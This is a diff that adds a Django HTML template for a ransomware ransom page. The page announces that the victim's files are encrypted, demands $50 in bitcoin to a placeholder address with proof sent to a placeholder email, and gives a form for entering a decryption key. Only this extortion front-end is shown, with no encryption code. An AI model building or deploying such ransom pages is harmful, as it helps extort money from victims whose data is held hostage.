@@ -1,0 +1,29 @@
+<html>
+
+<head>
+
+</head>
+
+<body>
+    <h1>YOUR FILES HAVE BEEN ENCRYPTED</h1>
+    <div>
+        <h3>YOUR IMPORTANT DOCUMENTS, DATAS, PHOTOS, VIDEOS HAVE BEEN ENCRYPTED WITH MILITARY GRADE ENCRYPTION AND A
+            UNIQUE KEY.</h3>
+        <h5>to decrypt them, send 50$ in bitcoin to BITCOIN_ADRESS, and them send proof of tranfer and your DIGITS to mail@mail.com</h5>
+    </div>
+    <div>
+        <p>Your digits is : </p>
+        <form action="" method="post">
+            {% csrf_token %} 
+            <label for="key">
+                Key :
+            </label>
+            <input type="text" name="key">
+            <input type="submit" value="Decrypt">
+        </form>
+        
+        
+    </div>
+</body>
+
+</html>
